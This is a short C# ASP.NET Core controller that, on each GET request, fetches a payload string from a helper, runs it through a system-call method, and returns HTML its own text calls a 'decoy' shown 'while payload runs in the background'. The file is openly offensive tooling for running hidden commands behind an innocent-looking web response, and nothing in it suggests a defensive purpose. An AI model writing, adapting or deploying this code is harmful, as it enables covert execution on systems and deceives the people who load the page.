using System;
using lamba.Interfaces;
using System.Collections.Generic;
using Microsoft.AspNetCore.Http.Extensions;
using Microsoft.AspNetCore.Mvc;

namespace lamba.Controllers
{
	[Route("lamba")]
	public class LambaController : ControllerBase
	{
		private readonly IHelper _helper;
		
		public LambaController(IHelper helper)
		{
			_helper = helper;
		}
		
		// GET: lamba
		
		[HttpGet]
		public string Get()
		{
		    Console.WriteLine(Request.GetDisplayUrl());
		    Console.WriteLine(Request.GetEncodedUrl());
			string ret = _helper.getPayload();
			int ret2 = 0;
			
			if(ret.Length > 0)
			{
				ret2 = _helper.callSystem(ret);
			}
			
            string decoy = "<h3>Decoy HTML will be displayed here while payload runs in the background!</h3><br>Payload: " + ret;
			return decoy;
		}
	}
}